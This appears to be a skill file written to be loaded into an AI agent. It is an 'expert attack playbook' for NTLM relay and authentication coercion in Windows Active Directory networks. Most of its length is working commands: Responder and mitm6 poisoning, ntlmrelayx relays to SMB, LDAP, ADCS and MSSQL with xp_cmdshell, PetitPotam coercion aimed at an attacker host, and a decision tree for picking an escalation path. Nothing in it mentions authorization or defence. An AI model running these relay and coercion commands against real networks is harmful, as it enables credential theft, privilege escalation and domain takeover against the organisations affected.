---
name: ntlm-relay-coercion
description: >-
  NTLM relay and authentication coercion playbook. Use when capturing and relaying NTLM authentication to escalate privileges via SMB, LDAP, HTTP, or MSSQL relay targets, combined with PetitPotam, PrinterBug, and other coercion methods.
---

# SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert NTLM relay and coercion techniques. Covers relay to SMB/LDAP/HTTP/MSSQL, signing requirements, Responder poisoning, mitm6, cross-protocol relay, WebDAV coercion, and all major coercion methods. Base models miss signing/EPA requirements and cross-protocol relay constraints.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ESC8 (relay to ADCS enrollment)
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL modification via LDAP relay (RBCD, shadow creds)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks after relay success
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for post-relay lateral movement

### Advanced Reference

Also load [COERCION_METHODS.md](./COERCION_METHODS.md) when you need:
- Detailed coercion method comparison (PetitPotam, PrinterBug, DFSCoerce, etc.)
- RPC function-level details and prerequisites
- Coercer tool usage and discovery

---

## 1. NTLM RELAY FUNDAMENTALS

```
Victim          Attacker (relay)         Target
  │                 │                      │
  │── NTLM Auth ──→│                      │  (1) Victim authenticates (coerced/poisoned)
  │                 │── Forward Auth ─────→│  (2) Attacker relays to target
  │                 │←─ Challenge ──────── │  (3) Target sends challenge
  │←─ Challenge ────│                      │  (4) Attacker forwards challenge to victim
  │── Response ────→│                      │  (5) Victim computes response
  │                 │── Forward Response ─→│  (6) Attacker relays response to target
  │                 │←─ Authenticated! ────│  (7) Target accepts → attacker has session
```

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
|---|---|---|
| Security | Weak (crackable to NTLM hash) | Stronger (but still relayable) |
| Relay | Yes | Yes |
| Crack to hash | Yes (rainbow tables, crack.sh) | Offline brute-force only |
| Downgrade | Force via Responder `--lm` | Default in modern Windows |

---

## 2. RELAY TARGET MATRIX

| Target Protocol | What You Get | Signing Required by Default? | EPA/Channel Binding? |
|---|---|---|---|
| **SMB** | Command exec (if admin), file access | **DCs: Yes**, Workstations: No | No |
| **LDAP** | ACL modification, RBCD, shadow creds, add computer | **DCs: No** (negotiated) | No (unless configured) |
| **LDAPS** | Same as LDAP but encrypted | N/A | **Yes** (channel binding) |
| **HTTP (ADCS)** | Certificate enrollment (ESC8) | No | Depends on config |
| **MSSQL** | SQL queries, xp_cmdshell | No | No |
| **IMAP/SMTP** | Email access | No | No |
| **RPC** | Various (CA enrollment for ESC11) | Depends | No |

### Signing Check

```bash
# Check SMB signing on target
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
# Outputs hosts WITHOUT required SMB signing

# Nmap SMB signing check
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — CREDENTIAL CAPTURE

### LLMNR/NBT-NS/WPAD/mDNS Poisoning

```bash
# Start Responder (capture mode — don't relay, just capture hashes)
responder -I eth0 -dwP

# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Key protocols poisoned:
# LLMNR (UDP 5355) — Link-Local Multicast Name Resolution
# NBT-NS (UDP 137)  — NetBIOS Name Service
# WPAD              — Web Proxy Auto-Discovery (proxy config)
# mDNS (UDP 5353)   — Multicast DNS
```

### Responder + Relay (Don't Capture, Relay Instead)

```bash
# Disable HTTP and SMB servers in Responder (ntlmrelayx will handle them)
# Edit /etc/responder/Responder.conf: set HTTP and SMB to Off

# Start Responder for poisoning only
responder -I eth0 -dwP

# Start ntlmrelayx for relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — RELAY EXECUTION

### Relay to SMB (Admin Execution)

```bash
# Execute command on targets (requires admin privs on target)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SOCKS proxy (maintain sessions)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then: proxychains smbclient //TARGET/C$ -U DOMAIN/user
```

### Relay to LDAP (ACL Modification)

```bash
# Automatic RBCD (delegate-access)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Escalate via shadow credentials
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support

# Add computer account
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support

# Dump domain info
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

### Relay to ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Use with coercion to relay DC auth → get DC certificate
```

### Relay to MSSQL

```bash
ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```

---

## 5. MITM6 — IPv6 DNS TAKEOVER

```bash
# mitm6 exploits IPv6 auto-configuration to become DNS server
mitm6 -d domain.com

# Combined with ntlmrelayx
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --delegate-access -smb2support

# Flow:
# 1. mitm6 sends DHCPv6 replies → victim gets attacker as IPv6 DNS
# 2. Victim queries WPAD → attacker responds
# 3. NTLM auth triggered → relayed to LDAP
# 4. RBCD or shadow credentials set on victim computer
```

---

## 6. CROSS-PROTOCOL RELAY

### SMB → LDAP

Capture SMB authentication, relay to LDAP (requires no LDAP signing enforcement).

```bash
# Coerce SMB auth from DC, relay to LDAP on same or different DC
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support

# Trigger coercion (attacker receives SMB auth)
PetitPotam.py ATTACKER_IP DC01_IP
```

**Limitation**: SMB → LDAP relay fails if the source uses SMB signing negotiation that indicates relay.

### WebDAV → LDAP

WebDAV from workstations sends NTLM over HTTP → relay to LDAP (no signing issues).

```bash
# WebDAV coercion sends HTTP-based NTLM (no SMB signing concern)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Coerce via WebDAV (workstation must have WebClient service running)
# Use @ATTACKER_PORT format to force WebDAV
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
```

---

## 7. WEBDAV-BASED COERCION

WebClient service (WebDAV) converts SMB-type coercion to HTTP-based NTLM.

```bash
# Check if WebClient is running (port 80 listener or service query)
crackmapexec smb TARGET -u user -p pass -M webdav

# Start WebDAV coercion (from workstation, not server)
# Force target to authenticate via HTTP:
# Use UNC path format: \\ATTACKER@PORT\share
```

**Key advantage**: HTTP-based NTLM avoids SMB signing requirements.

---

## 8. NTLM RELAY DECISION TREE

```
Want to relay NTLM authentication
│
├── What auth can you capture?
│   ├── Responder poisoning (passive, wait for queries)
│   ├── mitm6 (DHCPv6 DNS takeover, periodic)
│   └── Active coercion → load COERCION_METHODS.md
│
├── What target to relay to?
│   │
│   ├── Need code execution?
│   │   ├── SMB target without signing → ntlmrelayx to SMB (§4)
│   │   └── MSSQL target → ntlmrelayx to MSSQL + xp_cmdshell (§4)
│   │
│   ├── Need domain escalation?
│   │   ├── LDAP signing not enforced?
│   │   │   ├── Relay to LDAP → RBCD (§4)
│   │   │   ├── Relay to LDAP → shadow credentials (§4)
│   │   │   └── Relay to LDAP → add computer + delegate (§4)
│   │   └── LDAP signing enforced?
│   │       └── Relay to ADCS HTTP (ESC8) → certificate (§4)
│   │
│   └── Need certificate?
│       └── Relay to ADCS HTTP/RPC → ESC8/ESC11 (§4)
│
├── Source is SMB-based?
│   ├── Target is SMB → check signing (§2)
│   ├── Target is LDAP → may work (cross-protocol, §6)
│   └── Target is HTTP → works (cross-protocol)
│
├── Source is HTTP-based (WebDAV)?
│   └── Relay to any target (no signing issues, §6/§7)
│
└── Relay fails?
    ├── Check signing requirements (§2)
    ├── Check EPA/channel binding
    ├── Try cross-protocol (SMB → LDAP)
    └── Try WebDAV coercion (avoids SMB signing)
```
